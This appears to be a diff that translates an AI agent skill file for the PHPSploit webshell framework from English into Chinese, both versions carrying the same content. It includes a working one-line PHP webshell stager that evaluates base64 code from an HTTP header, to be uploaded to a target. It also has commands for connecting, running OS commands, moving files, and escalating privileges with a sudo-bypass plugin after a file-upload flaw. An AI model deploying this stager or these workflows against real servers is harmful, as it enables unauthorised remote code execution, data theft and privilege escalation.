@@ -1,65 +1,62 @@
 ---
 name: phpsploit
 description: >
-  This skill should be used when the user asks about "phpsploit", "you have a
-  PHP webshell on target and need an interactive shell, file ops, and
-  plugin-based post-exploitation over HTTP". Stealth post-exploitation
-  framework operating via HTTP headers inside a webshell.
+  此技能适用于用户询问关于 "phpsploit"、"目标上已有 PHP webshell，需要通过 HTTP 获得交互式 shell、文件操作及插件化后渗透能力" 等内容。通过 HTTP 头在 webshell 内隐蔽运行的后渗透框架。
 ---
 
 # PHPSploit
 
-Stealth PHP webshell framework — full interactive session tunneled in HTTP headers.
+隐蔽 PHP webshell 框架 —— 通过 HTTP 头隧道化的完整交互式会话。
 
-## Quick Start
+## 快速开始
 
 ```bash
 pip install phpsploit
 phpsploit
 
-# Set target and connect
+# 设置目标并连接
 set TARGET http://target.com/shell.php
 set PASSKEY MySecret
 exploit
 ```
 
-## Core Commands
+## 核心命令
 
-| Command | Purpose |
-|---------|---------|
-| `set TARGET <url>` | Webshell URL |
-| `set PASSKEY <key>` | Obfuscation passkey |
-| `exploit` | Connect to shell |
-| `ls`, `cd`, `cat` | File system ops |
-| `upload <local> <remote>` | Upload file |
-| `download <remote>` | Download file |
-| `run <cmd>` | Execute OS command |
-| `load <plugin>` | Load plugin |
+| 命令 | 用途 |
+|------|------|
+| `set TARGET <url>` | 设置 webshell URL |
+| `set PASSKEY <key>` | 设置混淆密钥 |
+| `exploit` | 连接到 shell |
+| `ls`、`cd`、`cat` | 文件系统操作 |
+| `upload <local> <remote>` | 上传文件 |
+| `download <remote>` | 下载文件 |
+| `run <cmd>` | 执行系统命令 |
+| `load <plugin>` | 加载插件 |
 
-## Webshell Setup
+## Webshell 配置
 
-Minimal PHP stager (upload to target):
+最小化 PHP stager（上传到目标服务器）：
 ```php
 <?php @eval(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
 ```
 
-## Common Workflows
+## 常用工作流程
 
-**Post-exploitation after file upload vuln:**
+**利用文件上传漏洞后进行后渗透：**
 ```
 set TARGET http://target.com/uploads/shell.php
 exploit
 run whoami
 ```
 
-**Escalate with plugin:**
+**通过插件提权：**
 ```
 load post/exploit/sudo-bypass
 run
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
-|------|--------------|
-| `references/` | Webshell variants and plugin list |
+| 文件 | 加载时机 |
+|------|----------|
+| `references/` | webshell 变体与插件列表 |
